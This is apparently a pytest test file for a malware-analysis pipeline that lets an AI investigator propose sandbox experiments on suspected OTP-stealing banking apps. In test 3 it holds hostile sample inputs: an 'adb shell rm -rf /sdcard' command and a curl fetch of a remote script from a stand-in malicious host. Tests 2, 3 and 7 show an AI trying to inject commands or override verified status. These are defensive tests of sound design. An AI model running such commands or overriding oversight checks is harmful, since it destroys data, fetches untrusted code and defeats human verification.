from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from fraudshield.core.config import Settings
from fraudshield.core.database import Database
from fraudshield.core.repository import AnalysisRepository, IndicatorRepository
from fraudshield.deceptiscope.dynamic import DynamicLiteAnalyzer
from fraudshield.deceptiscope.experiments import (
    ExperimentPlanner,
)
from fraudshield.deceptiscope.investigation import (
    AIInvestigatorClient,
    validate_feedback_update_payload,
    validate_hypothesis_payload,
)
from fraudshield.deceptiscope.pipeline import APKAnalysisPipeline
import pytest

SYNTHETIC_OTP_MARKER = "TEST-OTP-749231"
PACKAGE = "com.example.demobank"


class FakeDynamicAnalyzer(DynamicLiteAnalyzer):
    def __init__(
        self,
        settings,
        *,
        logcat: str = "",
        qemu: str = "1",
        fail: dict[tuple[str, ...], Exception] | None = None,
    ) -> None:
        super().__init__(settings)
        self.logcat = logcat
        self.qemu = qemu
        self.fail = fail or {}
        self.calls: list[tuple[str, ...]] = []
        self._snapshot_count = 0

    def observe(
        self,
        apk_path: Path,
        package_name: str,
        *,
        experiment_types: list[Any] | None = None,
        plan_items: list[dict[str, Any]] | None = None,
        active_marker: Any | None = None,
    ) -> dict[str, Any]:
        marker_str = getattr(active_marker, "value", str(active_marker or SYNTHETIC_OTP_MARKER))
        if SYNTHETIC_OTP_MARKER in self.logcat and marker_str != SYNTHETIC_OTP_MARKER:
            self.logcat = self.logcat.replace(SYNTHETIC_OTP_MARKER, marker_str)
        return super().observe(
            apk_path,
            package_name,
            experiment_types=experiment_types,
            plan_items=plan_items,
            active_marker=active_marker,
        )

    def _run(self, *args: str, timeout: int | None = None) -> str:
        key = tuple(args)
        self.calls.append(key)
        for fail_key, exc in self.fail.items():
            if key == fail_key or (key[:2] == ("emu", "sms") and fail_key[:2] == ("emu", "sms")):
                raise exc
            if len(key) >= 3 and len(fail_key) >= 3 and key[:3] == fail_key[:3]:
                raise exc
        if key == ("shell", "getprop", "ro.kernel.qemu"):
            return self.qemu
        if args[0] == "install":
            return "Success"
        if args[0] == "uninstall":
            return "Success"
        if key == ("logcat", "-c"):
            return ""
        if key == ("logcat", "-d", "-t", "500"):
            return self.logcat
        if key[:2] == ("emu", "sms"):
            return "OK"
        if key[:2] == ("shell", "monkey"):
            return "Events injected: 1"
        if key[:2] == ("shell", "pidof"):
            return "1234"
        if key[:3] == ("shell", "dumpsys", "activity"):
            return f"mResumedActivity: ActivityRecord{{u0 {PACKAGE}/.MainActivity t1}}"
        if key[:3] == ("shell", "dumpsys", "package"):
            return f"Package [{PACKAGE}] requested permissions: android.permission.READ_SMS"
        if key[:3] == ("shell", "dumpsys", "accessibility"):
            return f"Enabled services include {PACKAGE}/.CaptureService"
        if key[:3] == ("shell", "run-as", PACKAGE):
            self._snapshot_count += 1
            return "./files/before.txt\n" if self._snapshot_count == 1 else "./files/before.txt\n./files/after.txt\n"
        if key[:3] == ("shell", "screencap", "-p"):
            return ""
        if key[:2] == ("shell", "ls"):
            return "-rw-rw---- 1 shell sdcard_rw 2048 fraudshield-deceptiscope-screen.png"
        if key[:2] == ("shell", "rm"):
            return ""
        raise RuntimeError(f"unexpected fake adb call: {key}")


@pytest.fixture()
def dynamic_settings(settings):
    return settings.with_overrides(dynamic_analysis_enabled=True, adb_emulator_serial="emulator-5554")



class MockAIInvestigatorClient(AIInvestigatorClient):
    """Predictable mock AI investigator for pipeline testing."""

    def __init__(
        self,
        settings: Settings,
        *,
        hypotheses: list[dict[str, Any]] | None = None,
        raw_requests: list[dict[str, Any]] | None = None,
    ) -> None:
        super().__init__(settings)
        self._mock_hypotheses = hypotheses
        self._mock_raw_requests = raw_requests

    def _request_json(self, prompt_payload: dict[str, Any]) -> str:
        evidence = prompt_payload.get("untrusted_evidence", [])
        evidence_ids = [item["evidence_id"] for item in evidence]
        first_id = evidence_ids[0] if evidence_ids else "E001"
        second_id = evidence_ids[1] if len(evidence_ids) > 1 else first_id

        if self._mock_hypotheses is not None:
            payload = {
                "hypotheses": self._mock_hypotheses,
                "experiment_requests": self._mock_raw_requests,
            }
            return json.dumps(payload)

        return json.dumps(
            {
                "hypotheses": [
                    {
                        "hypothesis_id": "H001",
                        "category": "OTP_INTERCEPTION",
                        "status": "SUPPORTED",
                        "confidence": 0.85,
                        "title": "Suspected OTP Interception",
                        "reasoning_summary": "App requests SMS permissions and registers SMS receiver.",
                        "supporting_evidence_ids": [first_id, second_id],
                        "contradicting_evidence_ids": [],
                        "missing_evidence": ["Runtime SMS access not verified"],
                        "recommended_experiment_types": ["SYNTHETIC_SMS", "NETWORK_OBSERVATION"],
                        "recommended_next_steps": ["Deliver synthetic SMS in sandbox"],
                        "limitations": ["Static analysis only"],
                    }
                ],
                "experiment_requests": [
                    {
                        "experiment_id": "EXP001",
                        "hypothesis_id": "H001",
                        "experiment_type": "SYNTHETIC_SMS",
                        "objective": "Observe SMS receiver behavior on synthetic OTP injection",
                        "expected_signal": "SMS receiver broadcast receipt and logcat marker correlation",
                        "priority": 1,
                    },
                    {
                        "experiment_id": "EXP002",
                        "hypothesis_id": "H001",
                        "experiment_type": "NETWORK_OBSERVATION",
                        "objective": "Capture outbound network requests following SMS receipt",
                        "expected_signal": "Exfiltration destination connection or DNS query",
                        "priority": 2,
                    },
                ],
            }
        )



def _setup_pipeline(
    tmp_path: Path,
    settings: Settings,
    *,
    logcat: str = "",
    fail_calls: dict[tuple[str, ...], Exception] | None = None,
    mock_ai: bool = True,
    ai_hypotheses: list[dict[str, Any]] | None = None,
    ai_requests: list[dict[str, Any]] | None = None,
) -> tuple[APKAnalysisPipeline, FakeDynamicAnalyzer]:
    db_path = tmp_path / "test.db"
    db = Database(db_path)
    db.initialize()
    analyses = AnalysisRepository(db)
    indicators = IndicatorRepository(db)
    pipeline_settings = settings.with_overrides(llm_provider="openai") if mock_ai else settings
    pipeline = APKAnalysisPipeline(pipeline_settings, analyses, indicators)

    fake_dynamic = FakeDynamicAnalyzer(pipeline_settings, logcat=logcat, fail=fail_calls)
    pipeline.dynamic = fake_dynamic

    if mock_ai:
        pipeline.ai_investigator = MockAIInvestigatorClient(
            pipeline_settings,
            hypotheses=ai_hypotheses,
            raw_requests=ai_requests,
        )

    return pipeline, fake_dynamic


# 1. AI requested experiment causes the corresponding trusted executor path to run
def test_ai_requested_experiments_drive_sandbox_execution(
    dynamic_settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr("fraudshield.deceptiscope.dynamic.shutil.which", lambda value: "adb")
    logcat = (
        f"08-25 10:00:01.000 1234 1234 I {PACKAGE}: SmsManager read {SYNTHETIC_OTP_MARKER}\n"
        f"08-25 10:00:02.000 1234 1234 I {PACKAGE}: Connect to https://c2.example.invalid\n"
    )
    pipeline, fake_dynamic = _setup_pipeline(tmp_path, dynamic_settings, logcat=logcat)

    apk_file = tmp_path / "test_target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="test_target.apk",
        sha256="fake-sha256-test",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=True,
    )

    findings = result["result"]
    assert findings["extraction"]["coverage"]["dynamic"] is True
    assert len(findings["experiment_results"]) == 2

    exp_ids = [res["experiment_id"] for res in findings["experiment_results"]]
    assert exp_ids == ["EXP001", "EXP002"]

    # Verify SMS injection was called on the trusted sandbox
    assert any(call[:2] == ("emu", "sms") for call in fake_dynamic.calls)

    # Verify runtime evidence was linked
    assert len(findings["runtime_evidence"]) > 0
    assert any(ev["evidence_type"] == "synthetic_marker_correlation" for ev in findings["runtime_evidence"])


# 2. AI cannot inject arbitrary experiment types
def test_ai_cannot_inject_arbitrary_experiment_types() -> None:
    evidence = {"E001", "E002"}
    accepted, errors = validate_hypothesis_payload(
        {
            "hypotheses": [
                {
                    "hypothesis_id": "H001",
                    "category": "OTP_INTERCEPTION",
                    "status": "PROPOSED",
                    "confidence": 0.8,
                    "title": "Invalid Experiment Injection",
                    "reasoning_summary": "Trying to run unapproved experiment",
                    "supporting_evidence_ids": ["E001"],
                    "contradicting_evidence_ids": [],
                    "missing_evidence": [],
                    "recommended_experiment_types": ["ARBITRARY_SHELL_EXEC", "DOWNLOAD_PAYLOAD"],
                    "recommended_next_steps": [],
                    "limitations": [],
                }
            ]
        },
        evidence,
    )
    assert len(accepted) == 1
    # Invalid experiment types must be stripped
    assert accepted[0]["recommended_experiment_types"] == []


# 3. AI cannot inject shell/ADB command payloads
def test_ai_cannot_inject_command_payloads() -> None:
    planner = ExperimentPlanner(Settings())
    hypotheses = [
        {
            "hypothesis_id": "H001",
            "category": "OTP_INTERCEPTION",
            "confidence": 0.8,
            "title": "OTP Hypothesis",
        }
    ]

    # Attempt forbidden execution fields
    bad_payload = {
        "experiment_requests": [
            {
                "experiment_id": "EXP001",
                "hypothesis_id": "H001",
                "experiment_type": "SYNTHETIC_SMS",
                "objective": "Legitimate objective",
                "expected_signal": "Legitimate signal",
                "priority": 1,
                "command": "adb shell rm -rf /sdcard",
            }
        ]
    }
    planned, errors = planner.plan_from_payload(bad_payload, hypotheses)
    assert len(planned) == 0
    assert any("forbidden execution fields" in err for err in errors)

    # Attempt free text injection
    injection_payload = {
        "experiment_requests": [
            {
                "experiment_id": "EXP001",
                "hypothesis_id": "H001",
                "experiment_type": "SYNTHETIC_SMS",
                "objective": "Execute curl https://malicious.site/script.sh",
                "expected_signal": "Check output",
                "priority": 1,
            }
        ]
    }
    planned_inj, errors_inj = planner.plan_from_payload(injection_payload, hypotheses)
    assert len(planned_inj) == 0
    assert any("invalid" in err for err in errors_inj)


# 4. Dynamic-disabled analysis does not execute experiments
def test_dynamic_disabled_does_not_execute_experiments(
    settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    disabled_settings = settings.with_overrides(dynamic_analysis_enabled=False)
    pipeline, fake_dynamic = _setup_pipeline(tmp_path, disabled_settings)

    apk_file = tmp_path / "target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="target.apk",
        sha256="fake-sha",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=True,  # requested, but system disabled
    )

    findings = result["result"]
    assert findings["extraction"]["coverage"]["dynamic"] is False
    assert findings["runtime_evidence"] == []
    assert findings["experiment_results"] == []
    assert len(fake_dynamic.calls) == 0

    # Experiment plan items must reflect UNAVAILABLE
    exp_plan = findings["ai_investigation"]["experiment_plan"]
    assert len(exp_plan) > 0
    assert all(item["status"] in {"UNAVAILABLE", "UNSUPPORTED"} for item in exp_plan)


# 5. Dynamic-unavailable analysis stays honest/inconclusive
def test_dynamic_unavailable_stays_honest_and_inconclusive(
    dynamic_settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr("fraudshield.deceptiscope.dynamic.shutil.which", lambda value: "adb")
    pipeline, fake_dynamic = _setup_pipeline(tmp_path, dynamic_settings)
    fake_dynamic.qemu = "0"  # Target is not an emulator

    apk_file = tmp_path / "target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="target.apk",
        sha256="fake-sha",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=True,
    )

    findings = result["result"]
    assert findings["extraction"]["coverage"]["dynamic"] is False

    # Hypotheses should NOT be marked confirmed
    verifications = findings["ai_investigation"]["hypothesis_verifications"]
    for v in verifications:
        assert v["verified_status"] != "CONFIRMED"
        assert v["confirmation_allowed"] is False


# 6. Runtime evidence is linked to experiments
def test_runtime_evidence_linked_to_experiments(
    dynamic_settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr("fraudshield.deceptiscope.dynamic.shutil.which", lambda value: "adb")
    logcat = f"08-25 10:00:01.000 1234 1234 I {PACKAGE}: SmsManager read {SYNTHETIC_OTP_MARKER}\n"
    pipeline, _ = _setup_pipeline(tmp_path, dynamic_settings, logcat=logcat)

    apk_file = tmp_path / "target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="target.apk",
        sha256="fake-sha",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=True,
    )

    findings = result["result"]
    exp_results = findings["experiment_results"]
    sms_exp = next(r for r in exp_results if r["experiment_type"] == "SYNTHETIC_SMS")
    assert len(sms_exp["evidence_ids"]) > 0

    runtime_ev_ids = {item["evidence_id"] for item in findings["runtime_evidence"]}
    for ev_id in sms_exp["evidence_ids"]:
        assert ev_id in runtime_ev_ids


# 7. Verification is deterministic and cannot be overwritten by AI output
def test_verification_is_deterministic_and_cannot_be_overwritten_by_ai() -> None:
    payload = {
        "hypothesis_updates": [
            {
                "hypothesis_id": "H001",
                "status": "CONFIRMED",  # Illegal override attempt
                "confidence": 1.0,  # Illegal override attempt
                "evidence_strength": 1.0,  # Illegal override attempt
                "reasoning_summary": "Revised explanation text",
            }
        ]
    }
    accepted, errors = validate_feedback_update_payload(payload, {"H001"})
    assert len(accepted) == 1
    # Verification and confidence must be stripped from updates
    assert "status" not in accepted["H001"]
    assert "confidence" not in accepted["H001"]
    assert "evidence_strength" not in accepted["H001"]
    assert accepted["H001"]["reasoning_summary"] == "Revised explanation text"
    assert any("non-authoritative fields" in err for err in errors)


# 8. Failed experiments do not kill the entire analysis
def test_failed_experiments_do_not_crash_analysis(
    dynamic_settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr("fraudshield.deceptiscope.dynamic.shutil.which", lambda value: "adb")
    # Fail one experiment's call
    fail_calls = {
        ("emu", "sms", "send", "+15551230000", SYNTHETIC_OTP_MARKER): RuntimeError("ADB SMS injection failed")
    }
    pipeline, _ = _setup_pipeline(tmp_path, dynamic_settings, fail_calls=fail_calls)

    apk_file = tmp_path / "target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="target.apk",
        sha256="fake-sha",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=True,
    )

    findings = result["result"]
    assert result["status"] == "completed"
    assert len(findings["experiment_results"]) == 2
    sms_res = next(r for r in findings["experiment_results"] if r["experiment_type"] == "SYNTHETIC_SMS")
    assert sms_res["status"] == "FAILED"


# 9. Existing static-only workflows remain functional
def test_static_only_analysis_succeeds(
    dynamic_settings,
    malicious_apk: bytes,
    tmp_path: Path,
    monkeypatch,
) -> None:
    monkeypatch.setattr("fraudshield.deceptiscope.dynamic.shutil.which", lambda value: "adb")
    monkeypatch.setattr("fraudshield.deceptiscope.experiments.shutil.which", lambda value: "adb")
    pipeline, fake_dynamic = _setup_pipeline(tmp_path, dynamic_settings)

    apk_file = tmp_path / "target.apk"
    apk_file.write_bytes(malicious_apk)

    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="target.apk",
        sha256="fake-sha",
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=False,
    )

    findings = result["result"]
    assert result["status"] == "completed"
    assert findings["extraction"]["coverage"]["dynamic"] is False
    assert len(fake_dynamic.calls) == 0
    assert findings["runtime_evidence"] == []

    # Plan items should be marked SKIPPED since dynamic=False was requested
    exp_plan = findings["ai_investigation"]["experiment_plan"]
    assert len(exp_plan) > 0
    assert all(item["status"] == "SKIPPED" for item in exp_plan)


# 10. Real uploaded workflow sets data_origin='uploaded' and analyze_demo is absent
def test_uploaded_workflow_data_origin(
    settings,
    tmp_path: Path,
    malicious_apk: bytes,
) -> None:
    pipeline, _ = _setup_pipeline(tmp_path, settings, mock_ai=False)
    assert not hasattr(pipeline, "analyze_demo")

    apk_file = tmp_path / "sample.apk"
    apk_file.write_bytes(malicious_apk)
    result = pipeline.analyze_uploaded(
        path=apk_file,
        original_name="sample.apk",
        sha256="0" * 64,
        size_bytes=len(malicious_apk),
        category="banking",
        dynamic=False,
    )

    assert result["status"] == "completed"
    assert result["data_origin"] == "uploaded"
    findings = result["result"]
    assert findings["extraction"]["analysis_quality"] in {"static-only", "partial"}
    assert findings["ai_investigation"]["status"] == "disabled"
